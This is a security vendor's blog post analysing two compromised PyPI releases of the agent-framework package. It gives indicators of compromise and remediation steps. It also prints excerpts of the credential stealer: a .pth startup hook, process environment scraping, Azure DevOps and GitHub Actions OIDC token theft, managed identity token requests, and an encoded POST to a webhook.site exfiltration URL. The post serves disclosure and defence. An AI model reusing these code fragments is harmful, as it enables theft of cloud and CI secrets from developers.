---
title: Two malicious agent-framework releases hit PyPI in 33 minutes
author: Hunter Schwartz
url: https://www.aikido.dev/blog/two-malicious-agent-framework-releases-hit-pypi-in-33-minutes
hostname: aikido.dev
description: Two malicious agent-framework releases on PyPI ran a credential stealer on every Python start, targeting Azure, Azure DevOps, and GitHub Actions secrets.
sitename: Aikido Security
date: "2026-11-17"
fingerprint: "3c40af49e7c06656"
---
## TL;DR:

`agent-framework` 1.26.1 and 1.26.2, two malicious releases of Microsoft Agent Framework's PyPI meta-package published 33 minutes apart on Nov 17, 2026, run a credential stealer on every Python start that targets Azure, Azure DevOps, and GitHub Actions secrets. Both have been removed from PyPI. Pin `agent-framework==1.26.0` and rotate every secret on any machine that installed either version.

## Who is affected

You're affected if you installed `agent-framework` 1.26.1 or 1.26.2 between 20:35 UTC and roughly 21:20 UTC on Nov 17, 2026, whether directly or through a loose requirement like `agent-framework>=1.26`. The package sees about 190,000 downloads a month, so even a 45-minute window adds up.

CI is where this hurts most. A pipeline or container build that resolved a fresh install during that window ran the stealer with whatever the job had access to. On Azure DevOps that means `SYSTEM_ACCESSTOKEN` and the pipeline's service connections. On GitHub Actions, 1.26.2 goes after the OIDC token any workflow with `id-token: write` can request. Developer laptops and Azure VMs with a managed identity attached are exposed too.

## Detecting it with Aikido Security

If you are an Aikido user, check your central feed and filter on malware issues. This will surface as a 100/100 critical issue. Aikido rescans nightly, but we recommend triggering a manual rescan now.

If you are not yet an Aikido user, you can [create an account](https://app.aikido.dev/login) and connect your repos. Our malware coverage is included in the free plan, no credit card required.

For future protection, consider [Aikido Safe Chain](https://github.com/AikidoSec/safe-chain) (open source). Safe Chain sits in your existing workflow, intercepting npm, npx, yarn, pnpm, and pnpx commands and checking packages against [Aikido Intel](https://intel.aikido.dev/) before install.

For broader coverage across your whole team, Aikido's [Device Protection](https://www.aikido.dev/protect/device-protection) gives you visibility and control over the software packages installed on your team's devices. It covers browser extensions, code libraries, IDE plugins, and build dependencies, all in one place. Stop malware before it gets installed.

## How to fix it

- Check with `pip show agent-framework`, and look for `agent_framework_meta.pth` or `af_runtime_diag.pth` in your `site-packages` directories, including CI caches and container images built since Nov 17.
- Pin `agent-framework==1.26.0` and rebuild affected environments.
- Treat every secret the machine could reach as stolen. That includes Azure DevOps personal access tokens and service connections, Azure service principal credentials, GitHub, npm, PyPI, and Hugging Face tokens, Docker registry credentials, and anything in `.env` files.
- Review Entra ID sign-in logs for the service principals and federated credentials used by your pipelines and workflows.
- Search your proxy and DNS logs for connections to `webhook[.]site`.

Removing the package stops future runs, but it doesn't undo anything that was already sent.

## Overview

On Nov 17, 2026, Microsoft's `agent-framework` package on PyPI was compromised. At 20:35 UTC, version 1.26.1 appeared with a credential stealer that runs every time Python starts, whether or not anything imports the package, and sends cloud and CI secrets to a webhook.site URL. `agent-framework` is the meta-package for [Microsoft Agent Framework](https://github.com/microsoft/agent-framework), Microsoft's Python SDK for building AI agents, so the machines most likely to install it are the ones holding Azure credentials worth stealing.

We pulled the wheel apart while it was still live. Then the attacker shipped again. Thirty-three minutes after the first upload, 1.26.2 was on PyPI and 1.26.1 was gone, replaced by the same stealer under a new filename with a fresh target in GitHub Actions. By 21:20 UTC both versions had been removed and 1.26.0 was the latest release again.

## 1.26.1 looks like a routine patch release

The attacker kept the first change small. 1.26.1 has the same README and the same `agent-framework-core[all]==1.26.0` pin as 1.26.0, which shipped five days earlier, so a dependency bot PR bumping it would look like routine noise. Diffing the two wheels turns up two new files and one edited one.

- `agent_framework_meta.pth`: not present in 1.26.0, added in 1.26.1
- `agent_framework_meta/_telemetry.py`: not present in 1.26.0, added in 1.26.1
- `agent_framework_meta/__init__.py`: 853 bytes in 1.26.0, 994 bytes in 1.26.1 with the loader added

The packaging gives the game away too. Microsoft's release pipeline publishes this package as a wheel plus a source distribution (sdist), and the two 1.26.0 files went up 40 seconds apart. 1.26.1 has only a wheel. Inside it, the `WHEEL` file keeps the old placeholder timestamp from the original build, while `METADATA`, `RECORD`, and the edited and added files are all stamped Nov 17. The two injected files are also world-writable (`rw-rw-rw-`), unlike everything else in the package. That fits someone who unpacked a legitimate wheel, edited it by hand, and uploaded the repacked file with valid publishing credentials. How they got those credentials isn't known yet.

## How the stealer gets to run

### The .pth hook

When Python starts, its [site module](https://docs.python.org/3/library/site.html) reads every `.pth` file in `site-packages`. These files exist to add directories to the import path, but any line that begins with `import` gets executed. Wheels never run code at install time, so for a wheel a `.pth` file is the closest thing to an npm `postinstall` hook, and in one way it's worse. It fires on every interpreter launch in that environment, which means your code never has to import `agent_framework` at all. Running `pytest` or `pip` itself is enough.

The file in 1.26.1 is a single line:

`import agent_framework_meta`
That import resolves to `agent_framework_meta/__init__.py`, where the attacker appended a loader below the legitimate version lookup and wrapped it so it can never raise:

```
# Lightweight runtime diagnostics hook.
try:
    from . import _telemetry as _telemetry
    _telemetry._start()
except Exception:
    pass
```
### Forking into the background

`_start()` makes sure the payload runs once per process tree and never slows down the Python process that triggered it:

```
def _start():
    if os.environ.get("_AF_TEL"):
        return
    os.environ["_AF_TEL"] = "1"
    try:
        if hasattr(os, "fork"):
            pid = os.fork()
            if pid == 0:
                try:
                    os.setsid()
                except Exception:
                    pass
                _run()
                os._exit(0)
            return
    except Exception:
        pass
    try:
        import threading
        t = threading.Thread(target=_run)
        t.daemon = True
        t.start()
    except Exception:
        pass
```
Child processes inherit the `_AF_TEL` environment variable, which stops every subprocess Python spawns from firing the stealer again. On Linux and macOS it forks and calls `setsid()`, so the child detaches into its own session and keeps working after your command returns. On Windows, where there's no `fork`, it falls back to a daemon thread.

## What the stealer collects

### Environment variables, including other processes'

The stealer copies any environment variable whose name contains one of a long list of substrings, among them `TOKEN`, `SECRET`, `KEY`, `AZURE`, `AWS`, `GITHUB`, `HF_`, `OPENAI`, `FOUNDRY`, `SYSTEM`, `BUILD`, `PIP`, `NPM`, and `NUGET`. Then it reads `/proc/<pid>/environ` for up to 300 running processes:

```
for e in glob.glob("/proc/[0-9]*/environ")[:300]:
    try:
        raw = open(e, "rb").read().decode("utf-8", "replace")
        hits = []
        for kv in raw.split("\x00"):
            if any(x in kv.upper() for x in ("TOKEN","SECRET","PASSWORD","KEY=","ENDPOINT_AUTH","SYSTEM_ACCESSTOKEN","IDENTITY_HEADER")):
                hits.append(kv[:2000])
```
On a CI runner, that reaches secrets held by the build agent process itself, beyond whatever was handed to the Python step.

### Credential files on disk

It globs a list of well-known credential locations and reads up to 60 matching files under 256 KB each, including:

- Azure CLI state in `~/.azure/*.json`
- `pip.conf`, `.npmrc`, `.netrc`, and `.git-credentials`
- Docker's `config.json`
- Hugging Face tokens
- Azure DevOps agent `.credentials` files under `_work` directories and `vss-agent` installs
- `.env` and JSON files in `/app` and `/workspace`, the usual container app roots

### Azure DevOps pipeline tokens

If the payload finds itself inside an Azure DevOps pipeline, it tries to mint an OpenID Connect (OIDC) token:

```
at = os.environ.get("SYSTEM_ACCESSTOKEN") or os.environ.get("SYSTEM_ACCESSTOKEN") or ""
oe = os.environ.get("SYSTEM_OIDCREQUESTURI") or ""
if oe and at:
    for suffix, body in [("?api-version=7.1", {"scopes": ["api://AzureADTokenExchange"]}), ("?api-version=7.1", {})]:
        try:
            req = urllib.request.Request(oe + suffix, data=json.dumps(body).encode(), headers={"Authorization": "Bearer " + at, "Content-Type": "application/json"}, method="POST")
            out["ado"]["oidc"] = urllib.request.urlopen(req, timeout=15).read().decode("utf-8", "replace")[:20000]
```
Pipelines that deploy to Azure through workload identity federation don't store a client secret. The pipeline requests a short-lived OIDC token from Azure DevOps and exchanges it with Microsoft Entra ID for an Azure access token as the service connection's service principal. A stolen OIDC token lets an attacker make that same exchange and act with whatever rights the service connection has. The request here doesn't pass a `serviceConnectionId`, so this step may fail depending on the pipeline setup. `SYSTEM_ACCESSTOKEN` itself is already captured by the environment variable sweep, and on its own it gives access to the organization's repos, artifacts, and pipelines.

### Managed identity tokens

Next, it asks the local identity endpoint for access tokens to 12 Azure resources, among them Azure Resource Manager, Microsoft Graph, Key Vault, Storage, Cognitive Services, Azure Machine Learning, Azure AI Foundry, Container Registry, and Azure DevOps (`499b84ac-1321-427f-aa17-267ca6975798`). On App Service and Functions it uses `IDENTITY_ENDPOINT` with the `IDENTITY_HEADER` secret. Everywhere else it falls back to the Azure Instance Metadata Service (IMDS) at `169.254.169.254`, which hands tokens to any process on a VM with a managed identity attached. It also grabs the VM's instance metadata.

### Sending it home

Everything goes out in one POST request. The destination is base64-encoded in the source to keep it out of a casual grep:

```
_ENC = "aHR0cHM6Ly93ZWJob29rLnNpdGUvZDM4MWZkODAtZWM2Mi00MmFkLThmNWMtZDFiMTUxMDNjOWJi"
# decodes to https://webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb
```
```
def _post(tag, data):
    try:
        import urllib.request
        u = base64.b64decode(_ENC).decode()
        body = base64.b64encode(zlib.compress(json.dumps(data, default=str).encode("utf-8", "replace"), 9))
        req = urllib.request.Request(u + "?t=" + tag, data=body, headers={"Content-Type": "application/octet-stream", "User-Agent": "af-runtime-diagnostics/1"})
        urllib.request.urlopen(req, timeout=25).read()
    except Exception:
        pass
```
The data is serialized to JSON, zlib-compressed, and base64-encoded, then sent with a `User-Agent` of `af-runtime-diagnostics/1` to keep up the telemetry cover story. Webhook.site is a free request-inspection service, so the attacker didn't need any infrastructure of their own. They read the stolen data straight off the token's page.

## Thirty-three minutes later, 1.26.2

At 21:08 UTC, version 1.26.2 was published, again as a wheel with no sdist, and 1.26.1 was pulled from PyPI around the same time. The new release reads like an attacker who expected anyone diffing `agent_framework_meta` to spot the first one. `__init__.py` is back to the byte-identical clean file from 1.26.0, and the payload moved out of the package directory into a top-level module with a `.pth` file named to match.

- Startup hook: `agent_framework_meta.pth` in 1.26.1, `af_runtime_diag.pth` in 1.26.2
- Payload: `agent_framework_meta/_telemetry.py` in 1.26.1, `af_runtime_diag.py` in 1.26.2
- Loader: appended to `agent_framework_meta/__init__.py` in 1.26.1, `_start()` called at the bottom of `af_runtime_diag.py` in 1.26.2
- User-Agent: `af-runtime-diagnostics/1` in 1.26.1, `runtime-diagnostics/1` in 1.26.2
- Credential file cap: 60 in 1.26.1, 80 in 1.26.2
- GitHub Actions OIDC theft: no in 1.26.1, yes in 1.26.2

The collection and exfiltration code is otherwise the same, down to the `_ENC` string and the webhook.site token. The real addition is a block aimed at GitHub Actions:

```
# GitHub Actions OIDC (Azure federated credential)
try:
    u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL") or ""
    t = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN") or os.environ.get("ACTIONS_RUNTIME_TOKEN") or ""
    if u and t:
        for aud in ("api://AzureADTokenExchange", "https://management.azure.com/"):
            try:
                sep = "&" if "?" in u else "?"
                uu = u + sep + "audience=" + urllib.parse.quote(aud, safe="")
                req = urllib.request.Request(uu, headers={"Authorization": "Bearer " + t, "Accept": "application/json", "User-Agent": "runtime-diagnostics/1"})
                out["gh_oidc"][aud] = urllib.request.urlopen(req, timeout=12).read().decode("utf-8", "replace")[:20000]
```
When a GitHub Actions workflow is granted `id-token: write`, the runner exposes `ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN` so the workflow can request an OIDC token. Workflows that log in to Azure with a federated credential exchange token with Entra ID, the same trick the Azure DevOps code goes after. With the token in hand, an attacker can do the exchange themselves and act as the workflow's Azure identity. 1.26.2 also widened the net to match, adding `ACTIONS`, `OIDC`, `RUNNER`, and `ARM_` to the environment variable filter and adding the GitHub-hosted runner's `_temp` directory and Azure CLI folder to the file list.

## Who this is aimed at

The first release went after Azure DevOps and Azure-hosted workloads. Half an hour later, the second added GitHub Actions workflows that deploy to Azure. Both lists line up with where Agent Framework users run their code, and the resource list covers the Microsoft AI services they build on, such as Azure AI Foundry and Azure Machine Learning. A patch release with an unchanged dependency pin is also about as low-suspicion as an update gets. Any project with a loose requirement like `agent-framework>=1.26` picks it up on the next install, and Dependabot or Renovate will happily open the PR.

The `.pth` trick isn't new. The LiteLLM compromise in March 2026 used the same startup hook to run its payload on every Python launch, and AI SDKs keep making good targets because the machines that install them hold cloud and model provider credentials. Python still has no switch to turn `.pth` execution off, so the hook keeps firing long after anyone has stopped looking at the install log.

The quick follow-up release is worth noting too. An attacker who still holds publishing access can swap one malicious version for another faster than most teams can block the first, so a fix that keys on a single filename or hash is already out of date.


## Indicators of compromise

**Network indicators**

- Exfiltration endpoint: `https://webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb?t=telemetry`
- User-Agent (1.26.1): `af-runtime-diagnostics/1`
- User-Agent (1.26.2): `runtime-diagnostics/1`

**Host indicators**

- `agent_framework_meta.pth` or `af_runtime_diag.pth` in `site-packages`
- `af_runtime_diag.py` at the top level of `site-packages`
- Environment variable `_AF_TEL=1` set in Python processes

**Affected packages**

- agent-framework@1.26.1
- agent-framework@1.26.2

**File hashes (SHA256), 1.26.1**

- `agent_framework-1.26.1-py3-none-any.whl`: `d27fa34414e6201d5e03e559ef634f020057554d7b3f4898dd5d7cd3e989e110`
- `agent_framework_meta/_telemetry.py`: `39fa329f2a93f734b0bb8f5adb203ea3331d1ae479832a5015a54cb17aabd663`
- `agent_framework_meta/__init__.py`: `c275ccbe520ef3c0f02dc6a35389e427f9f1b4e0b12e140cd7bf7179ce143f02`
- `agent_framework_meta.pth`: `21f28e8517a10ffe431f8d68f5875c85eca4001ae6d118322b0a41873998eb5e`

**File hashes (SHA256), 1.26.2**

- `agent_framework-1.26.2-py3-none-any.whl`: `3d20a8bc91351a9a16b6db243b848ceca0206b7a8623b02d2af553a9c9f7e0a9`
- `af_runtime_diag.py`: `54d885b7d7161c9ed96489c66364c4bfbf635929166843bba10d97d46b5a2e1f`
- `af_runtime_diag.pth`: `325e7e9f0ec94e41ad1a1b7a3f18a6b8b5bffece2e2b97b8d3369eb967452f93`
